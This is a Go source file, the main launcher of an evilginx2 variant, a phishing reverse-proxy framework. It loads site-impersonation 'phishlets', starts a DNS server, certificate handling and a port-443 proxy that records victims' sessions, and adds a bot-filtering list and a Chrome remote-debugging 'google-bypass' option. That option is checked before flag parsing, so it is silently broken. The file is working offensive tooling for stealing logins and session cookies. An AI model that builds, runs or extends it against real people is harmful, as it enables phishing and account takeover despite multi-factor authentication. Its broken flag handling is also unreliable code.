package main

import (
	"bytes"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"regexp"

	"github.com/kgretzky/evilginx2/core"
	"github.com/kgretzky/evilginx2/database"
	elog "github.com/kgretzky/evilginx2/log"
)

var (
	phishlets_dir  = flag.String("p", "./phishlets", "Phishlets directory path")
	templates_dir  = flag.String("t", "", "HTML templates directory path")
	debug_log      = flag.Bool("debug", false, "Enable debug output")
	developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
	cfg_dir        = flag.String("c", "./config", "Configuration directory path")
	google_bypass  = flag.Bool("google-bypass", false, "Enable Google Bypass")
)

func joinPath(base_path, rel_path string) string {
	if filepath.IsAbs(rel_path) {
		return rel_path
	}
	return filepath.Join(base_path, rel_path)
}

func getenv(key, fallback string) string {
	value := os.Getenv(key)
	if value == "" {
		return fallback
	}
	return value
}

func init() {
	if *google_bypass {
		display := getenv("DISPLAY", ":99")

		exec.Command("pkill", "-f", "google-chrome.*--remote-debugging-port=9222").Run()
		elog.Info("Killed all google-chrome instances running in debug mode on port 9222")

		cmd := exec.Command("google-chrome", "--remote-debugging-port=9222", "--no-sandbox")
		var out bytes.Buffer
		var stderr bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &stderr
		cmd.Env = append(cmd.Env, fmt.Sprintf("DISPLAY=%s", display))

		err := cmd.Start()
		if err != nil {
			elog.Error("Failed to start google-chrome in debug mode: %v", err)
			elog.Error("Command output: %s", stderr.String())
			return
		}
		elog.Info("Started google-chrome in debug mode on port 9222")

		go func() {
			err = cmd.Wait()
			if err != nil {
				elog.Error("google-chrome process exited with error: %v", err)
				elog.Error("Command output: %s", stderr.String())
			}
		}()
	}
}

func main() {
	flag.Parse()

	exe_path, _ := os.Executable()
	exe_dir := filepath.Dir(exe_path)

	core.Banner()

	if *phishlets_dir == "" {
		*phishlets_dir = joinPath(exe_dir, "./phishlets")
		if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
			*phishlets_dir = "/usr/share/evilginx/phishlets/"
			if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
				elog.Fatal("you need to provide the path to directory where your phishlets are stored: ./evilginx -p <phishlets_path>")
				return
			}
		}
	}

	if *templates_dir == "" {
		*templates_dir = joinPath(exe_dir, "./templates")
		if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
			*templates_dir = "/usr/share/evilginx/templates/"
			if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
				*templates_dir = joinPath(exe_dir, "./templates")
			}
		}
	}

	if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
		elog.Fatal("provided phishlets directory path does not exist: %s", *phishlets_dir)
		return
	}
	if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
		err = os.MkdirAll(*templates_dir, os.FileMode(0o700))
		if err != nil {
			elog.Error("creating dir: %v", err)
		}
	}

	elog.DebugEnable(*debug_log)
	if *debug_log {
		elog.Info("debug output enabled")
	}

	elog.Info("loading phishlets from: %s", *phishlets_dir)

	if *cfg_dir == "" {
		usr, err := user.Current()
		if err != nil {
			elog.Fatal("%v", err)
			return
		}
		*cfg_dir = filepath.Join(usr.HomeDir, ".evilginx")
	}

	elog.Info("loading configuration from: %s", *cfg_dir)

	err := os.MkdirAll(*cfg_dir, os.FileMode(0o700))
	if err != nil {
		elog.Fatal("%v", err)
		return
	}

	crt_path := joinPath(*cfg_dir, "./crt")
	if err := core.CreateDir(crt_path, 0o700); err != nil {
		elog.Fatal("mkdir: %v", err)
		return
	}

	cfg, err := core.NewConfig(*cfg_dir, "")
	if err != nil {
		elog.Fatal("config: %v", err)
		return
	}
	cfg.SetTemplatesDir(*templates_dir)

	db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
	if err != nil {
		elog.Fatal("database: %v", err)
		return
	}

	core.NewAdmin(db, cfg, *cfg_dir)

	proxies := []string{}
	if cfg.GetSessionProxy() {
		proxies = core.ReadProxyList(*cfg_dir)
	}

	core.BOT_HOST(filepath.Join(*cfg_dir, "bot_host.txt"))
	core.BOT_UserAgent(filepath.Join(*cfg_dir, "bot_agent.txt"))

	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
	if err != nil {
		elog.Error("blacklist: %s", err)
		return
	}

	files, err := os.ReadDir(*phishlets_dir)
	if err != nil {
		elog.Fatal("failed to list phishlets directory '%s': %v", *phishlets_dir, err)
		return
	}
	for _, f := range files {
		if f.IsDir() {
			continue
		}
		pr := regexp.MustCompile(`([a-zA-Z0-9\-.]*)\.yaml`)
		rpname := pr.FindStringSubmatch(f.Name())
		if rpname == nil || len(rpname) < 2 {
			continue
		}
		pname := rpname[1]
		if pname != "" {
			pl, err := core.NewPhishlet(pname, filepath.Join(*phishlets_dir, f.Name()), cfg)
			if err != nil {
				elog.Error("failed to load phishlet '%s': %v", f.Name(), err)
				continue
			}
			cfg.AddPhishlet(pname, pl)
		}
	}

	ns, _ := core.NewNameserver(cfg)
	ns.Start()

	hs, _ := core.NewHttpServer()
	hs.Start()

	crt_db, err := core.NewCertDb(crt_path, cfg, ns, hs)
	if err != nil {
		elog.Fatal("certdb: %v", err)
		return
	}

	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, bl, proxies, *developer_mode)
	err = hp.Start()
	if err != nil {
		elog.Fatal("http proxy: %v", err)
		return
	}

	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
	if err != nil {
		elog.Fatal("%v", err)
		return
	}

	t.DoWork()
}